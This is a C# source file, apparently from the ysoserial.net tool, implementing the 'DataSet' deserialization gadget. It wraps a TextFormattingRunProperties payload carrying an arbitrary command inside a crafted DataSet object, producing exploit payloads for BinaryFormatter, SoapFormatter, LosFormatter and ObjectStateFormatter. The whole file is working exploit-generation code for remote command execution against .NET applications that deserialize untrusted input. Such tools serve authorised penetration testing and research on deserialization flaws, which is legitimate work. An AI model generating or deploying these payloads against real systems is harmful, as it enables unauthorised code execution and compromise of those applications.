using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.Serialization;
using System.Runtime.Serialization.Formatters.Binary;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using ysoserial.Helpers;
using ysoserial.Helpers;

namespace ysoserial.Generators
{
    class DataSetGenerator:GenericGenerator
    {
        public override string Name()
        {
            return "DataSet";
        }

        public override string Description()
        {
            return "DataSet gadget";
        }

        public override string Credit()
        {
            return "James Forshaw, implemented by Soroush Dalili";
        }

        public override bool isDerived()
        {
            return true;
        }

        public override List<string> SupportedFormatters()
        {
            return new List<string> { "BinaryFormatter", "ObjectStateFormatter", "SoapFormatter", "LosFormatter"};
        }

        // https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH_US_12_Forshaw_Are_You_My_Type_WP.pdf
        [Serializable]
        public class DataSetMarshal : ISerializable
        {
            object _fakeTable;
            MemoryStream _ms;
            public void GetObjectData(SerializationInfo info, StreamingContext context)
            {
                info.SetType(typeof(System.Data.DataSet));
                info.AddValue("DataSet.RemotingFormat", System.Data.SerializationFormat.Binary);
                info.AddValue("DataSet.DataSetName", "");
                info.AddValue("DataSet.Namespace", "");
                info.AddValue("DataSet.Prefix", "");
                info.AddValue("DataSet.CaseSensitive", false);
                info.AddValue("DataSet.LocaleLCID", 0x409);
                info.AddValue("DataSet.EnforceConstraints", false);
                info.AddValue("DataSet.ExtendedProperties", (System.Data.PropertyCollection)null);
                info.AddValue("DataSet.Tables.Count", 1);
                MemoryStream stm = new MemoryStream();
                if (_fakeTable != null)
                {
                    BinaryFormatter fmt = new BinaryFormatter();
                    fmt.Serialize(stm, _fakeTable);
                }
                else
                {
                    stm = _ms;
                }
                info.AddValue("DataSet.Tables_0", stm.ToArray());
            }

            public DataSetMarshal(object fakeTable)
            {
                _fakeTable = fakeTable;
            }
            public DataSetMarshal(MemoryStream ms)
            {
                _ms = ms;
            }
        }

        public override object Generate(string cmd, string formatter, Boolean test, Boolean minify, Boolean useSimpleType)
        {

            object init_payload = TextFormattingRunPropertiesGenerator.TextFormattingRunPropertiesGadget(cmd, minify, useSimpleType);

            if (formatter.Equals("binaryformatter", StringComparison.OrdinalIgnoreCase)
                || formatter.Equals("losformatter", StringComparison.OrdinalIgnoreCase)
                || formatter.Equals("objectstateformatter", StringComparison.OrdinalIgnoreCase)
                || formatter.Equals("soapformatter", StringComparison.OrdinalIgnoreCase))
            { 
                return Serialize(DataSetGeneratorGadget(init_payload), formatter, test, minify, useSimpleType);
            }
            else
            {
                throw new Exception("Formatter not supported");
            }
        }

        /* this can be used easily by the plugins as well */
        public static object DataSetGeneratorGadget(object toBeBFSserialized)
        {
            return new DataSetMarshal(toBeBFSserialized);
        }
    }
}
